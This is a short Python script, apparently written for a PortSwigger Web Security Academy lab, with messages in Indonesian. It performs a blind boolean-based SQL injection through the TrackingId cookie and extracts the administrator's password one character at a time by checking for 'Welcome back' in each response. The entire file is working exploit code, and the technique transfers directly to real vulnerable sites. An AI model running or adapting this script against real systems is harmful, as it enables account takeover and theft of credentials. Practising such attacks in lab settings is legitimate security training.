import requests

url = 'https://0acc005c0361d929829424ef000300a6.web-security-academy.net/product'
params = {'productId': '2'}
headers = {
    'Host': '0acc005c0361d929829424ef000300a6.web-security-academy.net',
    'Sec-Ch-Ua': '"Chromium";v="129", "Not=A?Brand";v="8"',
    'Sec-Ch-Ua-Mobile': '?0',
    'Sec-Ch-Ua-Platform': '"Windows"',
    'Accept-Language': 'en-US,en;q=0.9',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-User': '?1',
    'Sec-Fetch-Dest': 'document',
    'Accept-Encoding': 'gzip, deflate, br',
    'Priority': 'u=0, i',
    'Connection': 'keep-alive'
}
password = ""
print("Brute Forcing 20 kali...")
for i in range(1, 21):
    print("Brute Force password ke", i)
    for char in "abcdefghijklmnopqrstuvwxyz0123456789":
        cookies = {
            'TrackingId': f"17ASmuXWoj9Oiiap' AND (SELECT SUBSTRING(password,{i},1) FROM users WHERE username='administrator')='{char}",
            'session': "gyvLGKXt4lLvZSHWsEIwnMOw3XEHffvQ"
        }
        response = requests.get(url, headers=headers, params=params, cookies=cookies)
        if response.status_code == 200 and "Welcome back" in response.text:
            password += char
            print(f"Found Password huruf ke {i} adalah {char}")
            break

print(f"Password adalah {password}")
